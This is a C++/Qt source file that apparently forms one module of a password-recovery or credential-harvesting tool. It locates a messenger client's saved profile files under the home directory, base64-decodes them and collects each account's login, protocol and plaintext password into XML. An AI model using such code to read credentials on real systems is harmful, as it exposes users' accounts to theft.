#include "mdc.h"

#include <QDebug>
#include <QStringList>
#include <QFile>

#include "common.h"

mdc::mdc() {
    root = decoded.createElement("mdc");
    decoded.appendChild(root);
    findConfig();
}

void mdc::findConfig() {
    foreach(QString profile, dirList(homeDir() + ".MDC")) {
        QFile file(homeDir() + ".MDC/" + profile + "/ss.scs");
        if (file.open(QIODevice::ReadOnly))
            decoding(file);
    }
}

void mdc::createXML(QString &login, QString &pass, QString &proto) {

    QDomElement q = decoded.createElement("Account");
    root.appendChild(q);

    QDomElement tag = decoded.createElement("Login");
    q.appendChild(tag);
    QDomText t = decoded.createTextNode(login);
    tag.appendChild(t);

    tag = decoded.createElement("Password");
    q.appendChild(tag);
    t = decoded.createTextNode(pass);
    tag.appendChild(t);

    tag = decoded.createElement("Protocol");
    q.appendChild(tag);
    t = decoded.createTextNode(proto);
    tag.appendChild(t);
}

void mdc::decoding(QFile &path) {
        QByteArray text = QByteArray::fromBase64(path.readAll());
        QDomDocument tempDoc;
        tempDoc.setContent(text);

        QDomNode nRoot = tempDoc.documentElement().firstChild();

        while (!nRoot.isNull()) {
            QString login, pass, proto;
            for (int i = 0;i < nRoot.childNodes().count();i++) {
                if (nRoot.childNodes().at(i).toElement().tagName() == "key") {
                    login = nRoot.childNodes().at(i).toElement().text();
                    proto = login.left(login.indexOf("://"));
                    login = login.right(login.length() - login.indexOf("://") - 3);
                }

                if (nRoot.childNodes().at(i).toElement().tagName() == "value")
                    pass = nRoot.childNodes().at(i).toElement().text();
            }
            createXML(login, pass, proto);
            nRoot = nRoot.nextSiblingElement();
        }
    }

mdc* mdc::instance() {
    if (!instance_)
        instance_ = new mdc();
    return instance_;
}

mdc* mdc::instance_ = NULL;
